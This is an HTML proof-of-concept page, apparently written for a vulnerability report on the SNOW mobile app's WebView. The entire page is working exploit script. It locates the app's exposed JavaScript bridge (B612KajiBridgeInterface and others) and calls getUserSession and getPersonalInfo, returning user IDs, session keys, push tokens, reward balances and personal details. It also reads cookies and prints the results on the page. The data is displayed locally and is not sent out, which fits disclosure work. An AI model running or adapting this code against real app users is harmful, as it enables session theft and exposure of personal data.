
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{background:#111;color:#eee;font-family:monospace;font-size:13px;padding:14px;word-break:break-all}
.t{color:#f85149;font-weight:bold;font-size:15px;display:block;margin-bottom:12px}
.s{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:10px;margin-bottom:10px}
.k{color:#e3b341;min-width:130px;display:inline-block}
.v{color:#79c0ff}
.hi{color:#f85149;font-weight:bold}
.ok{color:#3fb950;font-weight:bold}
.sub{color:#8b949e;font-size:11px;display:block;margin-top:4px}
</style>
</head>
<body>
<span class="t">⚠ VULN-002 PoC: JS Bridge 개인정보 노출</span>
<div id="o"></div>
<script>
var o = document.getElementById('o');
function row(k, v, hi) {
  o.innerHTML += '<div class="s"><span class="k">' + k + '</span><span class="' + (hi?'hi':'v') + '">' + v + '</span></div>';
}

// Bridge 탐색
var b = null;
['B612KajiBridgeInterface','AndroidBridge','androidBridge'].forEach(function(n){
  try { if(!b && typeof window[n]!=='undefined') b=window[n]; } catch(e){}
});

if (!b) {
  o.innerHTML = '<div class="s"><span class="hi">Bridge NOT FOUND</span><span class="sub">SNOW WebView 컨텍스트에서 실행해야 합니다</span></div>';
} else {
  row('Bridge', 'B612KajiBridgeInterface FOUND', true);

  // 1. getUserSession — 세션 정보
  try {
    var s = JSON.parse(b.getUserSession()) || {};
    row('userId',          s.userId||'', true);
    row('userOid',         s.userOid||'', true);
    row('name',            s.name||'(없음)');
    row('availableReward', s.availableReward, true);
    row('isVIP',           String(s.isVIP));
    row('sessionKey',      s.sessionKey ? s.sessionKey.substr(0,50)+'...' : '', true);
    row('xColor',          s.xColor    ? s.xColor.substr(0,50)+'...'    : '', true);
    row('pushToken',       s.pushToken ? s.pushToken.substr(0,60)+'...' : '', true);
  } catch(e) { row('getUserSession ERR', e, false); }

  // 2. getPersonalInfo — 개인정보
  try {
    var p = b.getPersonalInfo();
    row('getPersonalInfo', p || '(empty)', true);
    if (p) {
      try {
        var pj = JSON.parse(p);
        Object.keys(pj).forEach(function(k){
          if(pj[k]) row('  └ '+k, String(pj[k]), true);
        });
      } catch(e) {}
    }
  } catch(e) { row('getPersonalInfo ERR', e, false); }

  // 3. appInfo — 앱/기기 정보
  try {
    var a = b.appInfo();
    row('appInfo', a || '(empty)');
  } catch(e) { row('appInfo ERR', e, false); }

  // 4. Cookie
  row('document.cookie', document.cookie || '(empty)', !!document.cookie);
}
</script>
</body>
</html>
